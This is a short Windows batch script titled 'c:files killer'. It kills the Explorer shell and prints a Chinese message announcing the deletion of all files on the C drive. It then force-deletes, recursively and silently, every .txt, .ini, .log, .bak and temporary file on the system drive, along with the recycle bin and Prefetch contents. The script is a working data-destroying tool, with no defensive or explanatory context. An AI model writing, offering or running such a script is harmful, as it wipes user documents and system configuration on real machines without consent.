@echo off
color 4f 
title c:files killer 
taskkill /im explorer.exe /f
echo 删除C盘所有文件...... 
del /f /s /q "%systemdrive%\*.tmp" 
del /f /s /q "%systemdrive%\*.dmp" 
del /f /s /q "%systemdrive%\*._mp" 
del /f /s /q "%systemdrive%\*.gid" 
del /f /s /q "%systemdrive%\*.old" 
del /f /s /q "%systemdrive%\*.chk" 
del /f /s /q "%systemdrive%\*.bak" 
del /f /s /q "%systemdrive%\*.log" 
del /f /s /q "%systemdrive%\*.txt" 
del /f /s /q "%systemdrive%\*.ini" 
del /f /s /q "%systemdrive%\Recycled\*.*" 
del /f /s /q "%systemdrive%\RECYCLER\*.*" 
del /f /s /q "%windir%\inf\*.pnf" 
del /f /s /q "%windir%\Prefetch\*.*" 